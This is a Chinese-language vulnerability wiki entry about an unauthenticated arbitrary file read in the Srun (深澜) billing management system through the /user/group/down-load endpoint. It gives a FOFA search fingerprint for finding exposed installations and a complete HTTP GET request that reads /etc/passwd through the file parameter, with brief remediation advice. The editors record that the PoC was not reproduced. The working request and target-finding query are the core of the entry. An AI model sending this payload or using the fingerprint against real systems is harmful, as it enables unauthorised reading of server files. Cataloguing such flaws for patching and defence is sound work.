---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "深澜计费管理系统 user/group/down-load file读取"
product: "深澜计费管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Linux进程权限，版本未知"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B7%B1%E6%BE%9C%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20down/%E6%B7%B1%E6%BE%9C%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20down-load%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/js/lib/slimscroll.js\""
fofa_unverified: "body="
id: "vw-9ea1ce8560847e08d2542426"
entity_id: "ve-9ea1ce8560847e08d2542426"
schema_version: "1"
---

# 深澜计费管理系统 user/group/down-load file读取

## 条目说明

- 对象与具体问题：深澜计费管理系统；user/group/down-load file读取
- 版本、配置及部署条件：Linux进程权限，版本未知
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 目录含down残词，应规范到深澜产品；slimscroll.js通用库指纹不独占产品
- 只有passwd读取及截图，无文本响应/任意路径边界/修复版本
- 在野已知无来源，风险表应降为待核

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

深澜计费管理系统 down-load 任意文件读取漏洞，未授权攻击者可读取服务器任意文件。

## 影响版本

深澜计费管理系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA： body="/js/lib/slimscroll.js"

POC/EXP：

```http
GET /user/group/down-load?file=/etc/passwd HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
```


![image-20250311141629531](./.resource/深澜计费管理系统down-load任意文件读取漏洞/media/image-20250311141629531.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
